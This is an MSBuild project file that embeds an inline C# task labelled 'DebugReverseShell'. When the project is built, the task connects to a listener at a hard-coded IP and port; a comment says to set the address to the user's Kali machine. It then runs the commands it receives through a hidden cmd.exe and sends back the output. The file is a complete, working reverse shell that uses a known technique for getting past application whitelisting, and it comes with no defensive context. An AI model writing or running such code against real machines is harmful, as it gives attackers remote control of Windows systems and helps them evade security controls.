<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="DebugShell">
    <DebugReverseShell />
  </Target>
  
  <UsingTask TaskName="DebugReverseShell" TaskFactory="CodeTaskFactory" 
             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Net.Sockets;
        using System.Diagnostics;
        using System.Text;
        using System.IO;
        using System.Threading;

        public class DebugReverseShell : Microsoft.Build.Utilities.Task {
            public override bool Execute() {
                new Thread(() => {
                    try {
                        string host = "192.168.1.8";  // â† CHANGE THIS TO YOUR ACTUAL KALI IP
                        int port = 4444;
                        
                        // Write debug info to file
                        File.WriteAllText(@"C:\Windows\Temp\debug.log", $"Attempting connection to {host}:{port} at {DateTime.Now}");
                        
                        using(TcpClient client = new TcpClient(host, port)) {
                            File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nConnected successfully at {DateTime.Now}");
                            
                            using(NetworkStream stream = client.GetStream()) {
                                // Send connection message
                                string welcome = "=== Reverse Shell Connected ===\n";
                                byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
                                stream.Write(welcomeBytes, 0, welcomeBytes.Length);
                                
                                byte[] buffer = new byte[1024];
                                
                                while(client.Connected) {
                                    if(stream.DataAvailable) {
                                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                                        if(bytesRead > 0) {
                                            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
                                            File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nReceived command: {command}");
                                            
                                            if(command == "exit") break;
                                            if(string.IsNullOrEmpty(command)) continue;
                                            
                                            string result = ExecuteCommand(command);
                                            byte[] output = Encoding.ASCII.GetBytes(result);
                                            stream.Write(output, 0, output.Length);
                                        }
                                    }
                                    Thread.Sleep(100);
                                }
                            }
                        }
                        File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nConnection closed at {DateTime.Now}");
                    } catch (Exception ex) {
                        File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nError: {ex.Message}");
                    }
                }) { IsBackground = true }.Start();
                
                return true;
            }
            
            private string ExecuteCommand(string command) {
                try {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    return output + error;
                } catch (Exception ex) {
                    return $"Error executing command: {ex.Message}\n";
                }
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
